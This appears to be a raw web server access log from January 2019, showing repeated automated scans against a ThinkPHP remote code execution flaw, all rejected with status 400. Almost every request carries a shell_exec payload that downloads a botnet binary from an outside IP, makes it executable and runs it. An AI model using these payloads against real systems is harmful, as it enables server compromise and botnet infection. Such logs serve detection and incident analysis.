41.235.182.3 - - [23/Jan/2019:20:15:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

121.84.86.234 - - [23/Jan/2019:20:22:42 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

116.65.89.179 - - [23/Jan/2019:20:31:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

193.250.60.181 - - [23/Jan/2019:20:37:55 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

188.18.193.169 - - [23/Jan/2019:20:49:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

94.50.236.10 - - [23/Jan/2019:21:25:58 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

94.23.156.20 - - [23/Jan/2019:21:37:36 +0330] "" 400 0 "-" "-" "-"

47.39.229.74 - - [23/Jan/2019:21:38:12 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

202.214.186.65 - - [23/Jan/2019:21:45:24 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

85.105.7.73 - - [23/Jan/2019:22:00:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

144.132.10.218 - - [23/Jan/2019:22:04:25 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

94.51.18.239 - - [23/Jan/2019:23:30:23 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

60.62.222.177 - - [23/Jan/2019:23:45:56 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

190.98.36.106 - - [23/Jan/2019:23:49:13 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

49.241.214.70 - - [23/Jan/2019:23:50:59 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

120.75.116.136 - - [24/Jan/2019:00:26:50 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

103.36.79.7 - - [24/Jan/2019:01:53:34 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

103.36.79.7 - - [24/Jan/2019:01:53:36 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

42.115.193.34 - - [24/Jan/2019:01:58:15 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

31.13.243.49 - - [24/Jan/2019:02:59:31 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

77.22.111.96 - - [24/Jan/2019:03:40:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

98.1.80.42 - - [24/Jan/2019:03:57:46 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

86.229.20.79 - - [24/Jan/2019:04:10:34 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

58.187.64.58 - - [24/Jan/2019:04:13:15 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

68.183.90.135 - - [24/Jan/2019:06:01:31 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://108.61.86.94/bins/Solstice.x86 -O /tmp/.Solstice; chmod 777 /tmp/.Solstice; /tmp/.Solstice Solstice.x86' HTTP/1.1" 400 166 "-" "Solstice/2.0" "-"

64.68.229.6 - - [24/Jan/2019:06:07:28 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

123.120.173.71 - - [24/Jan/2019:06:48:57 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

221.202.76.248 - - [24/Jan/2019:06:57:48 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

183.80.89.73 - - [24/Jan/2019:07:22:28 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

42.112.104.192 - - [24/Jan/2019:07:37:07 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

179.95.230.55 - - [24/Jan/2019:07:37:38 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

183.80.89.8 - - [24/Jan/2019:07:54:24 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

80.230.194.29 - - [24/Jan/2019:08:22:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

89.90.163.13 - - [24/Jan/2019:08:46:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

197.35.81.102 - - [24/Jan/2019:09:59:46 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

74.82.4.78 - - [24/Jan/2019:10:36:55 +0330] " r4---sn-a5msen7s.googlevideo.com.com\x01\xBB\x0Ch\xBFy\xE3K.\xB1\x14\x0B\xBD\xC2TS\x91\xDC\x0FKh\x9E\xF6\xC5];\x88\x0F\x13\xBD\xC5\xD6\xF2\xAE\x14\xC5Ks\xA9\xFE<5\xC2\x005\x00" 400 166 "-" "-" "-"

193.250.60.181 - - [24/Jan/2019:11:43:43 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

43.230.197.4 - - [24/Jan/2019:12:27:46 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

180.145.23.14 - - [24/Jan/2019:12:43:45 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

114.243.174.202 - - [24/Jan/2019:12:53:21 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

188.210.165.90 - - [24/Jan/2019:14:06:56 +0330] "G" 400 0 "-" "-" "-"

89.35.146.67 - - [24/Jan/2019:15:04:01 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

68.70.213.56 - - [24/Jan/2019:15:10:14 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

186.147.251.21 - - [24/Jan/2019:15:30:29 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

92.87.16.123 - - [24/Jan/2019:15:32:57 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.118.71.126 - - [24/Jan/2019:15:56:37 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

202.70.250.38 - - [24/Jan/2019:15:58:56 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\x00" 400 166 "-" "-" "-"

208.85.211.218 - - [24/Jan/2019:16:06:52 +0330] "x" 400 166 "-" "-" "-"

123.120.173.71 - - [24/Jan/2019:16:14:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

189.59.96.224 - - [24/Jan/2019:16:17:59 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

82.47.156.228 - - [24/Jan/2019:19:02:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

85.105.7.73 - - [24/Jan/2019:19:57:23 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.117.152.36 - - [24/Jan/2019:21:22:52 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

158.69.237.205 - - [24/Jan/2019:21:55:08 +0330] "" 400 0 "-" "-" "-"

158.69.237.205 - - [24/Jan/2019:21:55:23 +0330] "" 400 0 "-" "-" "-"

194.113.106.125 - - [24/Jan/2019:22:23:43 +0330] "" 400 0 "-" "-" "-"

121.84.86.234 - - [24/Jan/2019:22:41:12 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

58.135.224.45 - - [24/Jan/2019:22:53:06 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

103.2.64.231 - - [24/Jan/2019:23:58:01 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

113.22.59.250 - - [25/Jan/2019:00:54:03 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

46.243.179.232 - - [25/Jan/2019:01:00:35 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

112.28.77.213 - - [25/Jan/2019:01:36:46 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

118.68.205.254 - - [25/Jan/2019:01:54:18 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

36.106.21.29 - - [25/Jan/2019:02:21:00 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/bins/sefa.x86 -O /tmp/.sefa; chmod 777 /tmp/.sefa; /tmp/.sefa sefa.x86' HTTP/1.1" 400 166 "-" "sefa/2.0" "-"

220.246.209.65 - - [25/Jan/2019:03:10:06 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

112.234.7.215 - - [25/Jan/2019:03:13:49 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

117.198.103.116 - - [25/Jan/2019:03:19:07 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

42.118.10.161 - - [25/Jan/2019:03:20:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

61.86.79.193 - - [25/Jan/2019:03:37:44 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

124.140.76.80 - - [25/Jan/2019:06:13:06 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

222.138.138.64 - - [25/Jan/2019:06:29:58 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

43.230.197.4 - - [25/Jan/2019:07:46:03 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

126.58.237.63 - - [25/Jan/2019:08:04:00 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

116.90.206.18 - - [25/Jan/2019:08:54:09 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

103.2.64.231 - - [25/Jan/2019:08:59:44 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

89.215.238.65 - - [25/Jan/2019:09:35:47 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

112.137.114.117 - - [25/Jan/2019:09:42:07 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

202.214.186.65 - - [25/Jan/2019:10:32:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

144.132.10.218 - - [25/Jan/2019:11:27:44 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

82.47.156.228 - - [25/Jan/2019:12:27:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

